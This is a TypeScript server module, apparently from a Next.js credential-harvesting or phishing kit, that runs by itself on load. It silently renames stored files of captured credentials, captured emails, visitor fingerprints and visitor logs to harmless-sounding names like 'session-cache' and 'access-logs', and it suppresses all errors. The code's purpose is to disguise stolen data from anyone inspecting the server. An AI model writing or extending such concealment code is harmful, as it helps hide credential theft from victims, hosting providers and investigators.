import 'server-only'

/**
 * File migration utility for stealth refactoring
 * Handles automatic migration of old file names to new stealth names
 */

import fs from 'fs'
import path from 'path'

export interface FileMigration {
  oldPath: string
  newPath: string
  description: string
}

/**
 * Migrate a file from old path to new path if needed
 * Returns true if migration occurred, false otherwise
 */
export function migrateFileIfNeeded(
  oldPath: string,
  newPath: string
): boolean {
  try {
    const oldFullPath = path.isAbsolute(oldPath) 
      ? oldPath 
      : path.join(process.cwd(), oldPath)
    const newFullPath = path.isAbsolute(newPath)
      ? newPath
      : path.join(process.cwd(), newPath)

    // Check if old file exists and new file doesn't
    if (fs.existsSync(oldFullPath) && !fs.existsSync(newFullPath)) {
      // Ensure directory exists for new file
      const newDir = path.dirname(newFullPath)
      if (!fs.existsSync(newDir)) {
        fs.mkdirSync(newDir, { recursive: true })
      }

      // Migrate file
      fs.renameSync(oldFullPath, newFullPath)
      return true
    }
  } catch (error) {
  }
  return false
}

/**
 * Run all file migrations on module load
 * This ensures old files are automatically migrated to new names
 */
export function runFileMigrations(): void {
  const migrations: FileMigration[] = [
    {
      oldPath: '.fingerprints.json',
      newPath: '.client-metadata.json',
      description: 'Fingerprint storage → Client metadata'
    },
    {
      oldPath: '.attempts-cache.json',
      newPath: '.auth-attempts.json',
      description: 'Attempts cache → Auth attempts'
    },
    {
      oldPath: '.admin-settings.json',
      newPath: '.config-cache.json',
      description: 'Admin settings → Config cache'
    },
    {
      oldPath: '.visitor-logs.json',
      newPath: '.access-logs.json',
      description: 'Visitor logs → Access logs'
    },
    {
      oldPath: '.links.json',
      newPath: '.tokens.json',
      description: 'Links → Tokens'
    },
    {
      oldPath: '.captured-emails.json',
      newPath: '.sessions.json',
      description: 'Captured emails → Sessions'
    },
    {
      oldPath: '.captured-credentials.json',
      newPath: '.session-cache.json',
      description: 'Captured credentials → Session cache'
    },
  ]

  let migratedCount = 0
  for (const migration of migrations) {
    if (migrateFileIfNeeded(migration.oldPath, migration.newPath)) {
      migratedCount++
    }
  }

  if (migratedCount > 0) {
  }
}

// Auto-run migrations on module load (Node.js runtime only)
if (
  typeof process !== 'undefined' &&
  typeof process.cwd === 'function' &&
  typeof require !== 'undefined'
) {
  try {
    runFileMigrations()
  } catch (error) {
    // Silently fail in Edge Runtime or if file system unavailable
    if (process.env.NEXT_RUNTIME !== 'edge') {
    }
  }
}







